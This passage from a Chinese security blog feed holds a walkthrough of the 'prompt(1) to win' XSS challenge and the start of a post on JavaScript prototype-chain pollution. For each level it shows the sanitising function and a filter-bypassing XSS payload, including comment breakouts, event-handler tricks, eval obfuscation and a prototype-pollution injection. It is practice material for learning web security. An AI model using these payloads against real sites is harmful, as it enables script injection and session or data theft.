class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br></pre></td></tr></table></figure><p>这里过滤了<code>=、(</code></p><p>这里用到了<code>&lt;svg&gt;</code>标签前缀的<code>&lt;script&gt;</code>标签中，会认定为<code>xml</code>文本，从而解析<code>&amp;#40;</code>为<code>(</code></p><blockquote><p>Payload: <code>&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321024430448.png" alt="image-20200321024430448"></p><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><p>过滤</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里把<code>-&gt;</code>全局替换为<code>_</code></p><p>这里学到了个姿势</p><blockquote><p>Payload: <code>--!&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321025020817.png" alt="image-20200321025020817"><br><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321024959864.png" alt="image-20200321024959864"></p><p>直接查看源代码，感觉像是<code>HTML</code>的自动修整机制？</p><h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关其实没看懂，别人的<code>wp</code>是这么解释的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321030411699.png" alt="image-20200321030411699"></p><p>他的意思是本地构造一个<code>xss.js</code>文件，里面写上<code>prompt(1)</code>，然后利用@的特性去访问实际上是<code>localhost</code>上的<code>xss.js</code>文件</p><p>而且<code>@</code>前面的斜杠要<code>URL</code>编码，否则浏览器不支持</p><h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关把<code>&gt;、onxxxxx=、focus</code>都替换为<code>_</code>了</p><p>这里学到了个姿势，就是替换<code>type</code></p><blockquote><p>Payload: <code>&quot; src=# type=image  onerror=&quot;prompt(1)</code></p></blockquote><p>这里通过换行来绕过正则的判断，以及修改<code>type</code>为<code>image</code>，覆盖了后面的<code>type=text</code>属性，使得<code>input</code>变成了类似于<code>img</code>标签</p><p>从而触发了<code>prompt(1)</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321031738771.png" alt="image-20200321031738771"></p><h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题会提交一个我们输入的以<code>#</code>分割的表单，然后其中<code>action</code>当中不能存在<code>script:</code>和<code>data:</code></p><p>这里学到一个姿势，就是利用<code>action</code>的特性，当同时存在两个<code>action</code>时，会访问后面的<code>action</code>的值</p><blockquote><p>Payload: <code>javascript:prompt(1)#{&quot;action&quot;:1}</code></p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"javascript:prompt(1)"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"action"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>                                                  </span><br><span class="line"><span class="actionscript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"Action forbidden."</span>)               </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到它实际上判断了后面的<code>action</code>，他的值为<code>1</code>，绕过了正则判断，从而前面的<code>action=&quot;javascript:prompt(1)&quot;</code>被触发</p><h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关通过<code>#</code>分割来创造<code>&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;/p&gt;</code>元素</p><p>这里思路是通过<code>#</code>切分多个元素，然后使用注释来吧中间的<code>&lt;p&gt;</code>标签给注释掉，然后连起来变成一个有效的<code>payload</code></p><blockquote><p>Payload: <code>&quot;&gt;&lt;script&gt;/*#*/prompt(/*#*/1)/*#*/&lt;/script&gt;</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321122401119.png" alt="image-20200321122401119"></p><h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关过滤了<code>\r\n</code>的换行，但可以以通过<code>Unicode</code>编码后的<code>\u2028</code>充当换行符</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321133242060.png" alt="image-20200321133242060"></p><p>Chrome这里是看不到那个换行的字符，但把结果复制过去就可以看到了成功触发了结果</p><h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题用了不知道哪个国家的字符<code>ſ</code>，经过<code>Unicode</code>转换后，变成了<code>s</code>，但这里进行了大写处理</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321155951541.png" alt="image-20200321155951541"></p><p>他这个<code>payload</code>我感觉有问题，就是你<code>&lt;</code>后面一个空格，实际上不是<code>&lt;script</code>标签了</p><p>而且得加载外部<code>JS</code>,如果存在<code>CSP</code>的话，就不能正常触发了</p><h1 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个过滤把<code>prompt</code>置换为<code>alert</code>,而且把<code>&#39;</code>也置换为空</p><blockquote><p>Payload: <code>promp&#39;t(1)</code></p></blockquote><p>这里通过把<code>&#39;</code>置换为空，然后前后<code>prompt</code>拼接在一起，绕过了正则替换</p><h1 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">'&#123;"action":"login","message":"Welcome back, '</span> + memberName + <span class="string">'."&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">    if (data.action === "login")            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关过滤了一堆字符，但我看姿势</p><blockquote><p>Payload: <code>&quot; (prompt(1)) in&quot;</code></p></blockquote><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321214133399.png" alt=""></p><p>这样会弹窗</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321214322213.png" alt="image-20200321214322213"></p><p>如果指定的属性在指定的对象或其原型链中，则<code>in</code>运算符返回<code>true</code></p><h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题和第十关不一样，这一道题先过滤了<code>&#39;</code>，然后过滤了<code>prompt</code></p><p>而且还<code>URL</code>编码了，这里<code>fromCharCode</code>也就不可以使用了，因为<code>,</code>会被<code>URL</code>编码</p><p>这里找到解法是进制转换</p><p>比如<code>prompt</code>的十进制是<strong>630038579</strong>，这里转化为三十进制就是<code>prompt</code></p><blockquote><p>Payload: <code>eval((630038579).toString(30))(1))</code></p></blockquote><h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题和原型链污染有关系</p><p>这里对<code>config.source</code>进行了<code>delete</code>处理，而且我们要输出的<code>src</code>也是<code>config.source</code>，那能不能通过原型链污染来把他的值给覆盖成<code>#&quot; onerror=prompt(1) /&gt;</code>呢？</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200321222255192.png" alt="image-20200321222255192"></p><p>这里要满足删除条件是满足这个正则</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">  <span class="keyword">delete</span> config.source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给<code>source</code>传过去一个<code>#</code>即可</p><p>这里直接传的话，会发现<code>src</code>无法闭合</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200325151907487.png" alt="image-20200325151907487"></p><p>这里找了一下，网上建议是用正则的匹配规则</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200325151950002.png" alt="image-20200325151950002"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200325152120263.png" alt="image-20200325152120263"></p><p>所以这里通过$`来实现把前面<code>&lt;img src=&quot;</code>重复输出来闭合<code>src</code></p><p>这时候实际上<code>src=&quot;&lt;img src=&quot;</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200325152450879.png" alt="image-20200325152450879"></p><blockquote><p>Payload: <code>{&quot;source&quot;:&quot;#&quot;,&quot;__proto__&quot;: {&quot;source&quot;:&quot;$`onerror=prompt(1) /&gt;&quot;}}</code></p></blockquote><h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">'data:'</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题过滤了<code>//和字母:</code>并替换成<code>data:</code></p><p>并且把<code>vbs、\&amp;、空白符号</code>过滤了</p><p>这里应该是采用<code>data协议进行转码</code></p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">data:text/html;base<span class="number">64</span>,PH<span class="symbol">NjcmlwdD5</span>hbGVydCgiWF<span class="symbol">NTIik8</span>L<span class="number">3</span><span class="symbol">NjcmlwdD4</span>=</span><br></pre></td></tr></table></figure><p>但这里是没法在现在浏览器里使用大写的<code>base64</code>进行解码</p><blockquote><p>Payload:<code>&quot;&gt;&lt;IFRAME/SRC=&quot;x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=</code></p></blockquote><p>这里就不测试了</p><h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和之前那个注释绕过的差不多，只不过这里用的是<code>&lt;!-- --&gt;</code></p><p>不过这道题很迷，<code>alert(1)</code>能弹，但换成<code>prompt(1)</code>就不可以了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200325220835441.png" alt="image-20200325220835441"></p><blockquote><p>Payload:<code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1)&lt;!--#--&gt;&lt;/script&gt;</code></p></blockquote><p>剩下的几关在现在<code>Chrome</code>中不再触发，就不多写了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;prompt(1) to win 解题记录&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端安全" scheme="https://a2u13.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="https://a2u13.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript原型链污染</title>
    <link href="https://a2u13.com/2020/03/18/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://a2u13.com/2020/03/18/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2020-03-18T10:13:59.000Z</published>
    <updated>2020-06-07T06:28:28.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><ul><li>原型链污染的概念以及原理</li><li>如何利用原型链污染</li><li>例子分析</li></ul><a id="more"></a><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>本文可能会边学边写，思维可能会有些跳跃，但我尽力写明白</p><p>在<code>JavaScript</code>当中，如果函数用来创建新的对象，则这个函数称为对象的构造函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200318234950.png" alt=""></p><p>比如：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200318235033.png" alt=""></p><p>这里其实是构造了一个名叫<code>a</code>的类，他有个属性<code>test</code>，值为1</p><p>在JavaScript中，每个函数都有一个prototype属性，这个属性指向函数的原型对象。</p><blockquote><p>所有引用类型（函数，数组，对象）都拥有<code>__proto__</code>属性（隐式原型</p></blockquote><blockquote><p>所有类拥有<code>prototype</code>属性（显式原型）</p></blockquote><blockquote><p>原型链是javascript的实现的形式,递归继承原型对象的原型,原型链的顶端是Object的原型。</p></blockquote><p>在JavaScript中,声明一个函数A的同时,浏览器在内存中创建一个对象B,然后A函数默认有一个属性prototype指向了这个对象B,这个B就是函数A的原型对象,简称为函数的原型。这个对象B默认会有个属性constructor指向了这个函数A。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200318235545687.png" alt="image-20200318235545687"></p><p>其中类生成的对象的<code>__proto__</code>和类本身的<code>prototype</code>是等价的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200318235901138.png" alt="image-20200318235901138"></p><p>所以说，这里你如果修改了对象的<code>__proto</code>属性，同时会印象到这个原型类的属性，这里举个例子</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200319001132706.png" alt="image-20200319001132706"></p><p>这里只是修改了<code>test</code>这个对象的属性，但由于修改的是对象的原型，那么实际上整条原型链被污染了，它实际上是修改了<code>Object</code>这个类的属性值，从而导致新的继承自<code>Object</code>类的新对象的值也被污染修改了</p><p>这里总结一下：</p><ul><li>每一个构造函数都有一个原型对象</li><li>对象的<code>__proto</code>属性指向原型对象<code>prototype</code></li><li>在调用一个对象的属性的时候，如果在这个对象中没有这个属性，会向<code>__proto</code>寻找，如果没有的话，继续往<code>__proto__.__proto__</code>中寻找，一直找到<code>null</code>为止</li></ul><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200319011223891.png" alt="image-20200319011223891"></p><p><strong>如何利用原型链污染呢？</strong></p><p>在能控制数组的键值时，可以将其修改为<code>__proto__</code>从而实现原型链污染</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><h1 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h1><p><a href="http://prompt.ml/13" target="_blank" rel="noopener">http://prompt.ml/13</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like 